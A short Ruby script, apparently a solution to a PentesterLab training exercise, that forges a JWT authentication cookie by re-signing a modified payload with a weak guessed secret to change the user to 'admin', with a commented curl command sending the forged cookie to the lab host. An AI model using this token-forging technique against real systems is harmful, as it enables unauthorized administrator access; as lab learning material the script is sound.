# this exploit has so many secrets to figure out which of the 5 patch the original cookie signature that I was given.
# Once i can make my own cookie that has the correct key then I can change my user to admin and make a valid cookie.

require 'base64'
require 'openssl'
require 'json'

jwt = "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjpudWxsfQ.Tr0VvdP6rVBGBGuI_luxGCOaz6BbhC6IxRTlKOW8UjM"
header, data, signature = jwt.split(".")
secret = "pentesterlab"


def sign(data, secret)
    Base64.urlsafe_encode64(OpenSSL::HMAC.digest(OpenSSL::Digest.new('sha256'),secret, data)).gsub("=","")
# data.gsub!("=","")
end

payload = JSON.parse(Base64.urlsafe_decode64(data+"=="))
payload["user"]="admin"

newPayload = Base64.urlsafe_encode64(payload.to_json).gsub("=","")
puts header+"."+newPayload+"."+sign(header+"."+newPayload, secret)


# curl -H "Cookie: auth=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiYWRtaW4ifQ.d9nOzQ6Dc-N077EOEhFVJdvA7ufgp8qb-fLLUkIyqZc" http://ptl-2cf04b61-af603b6e.libcurl.so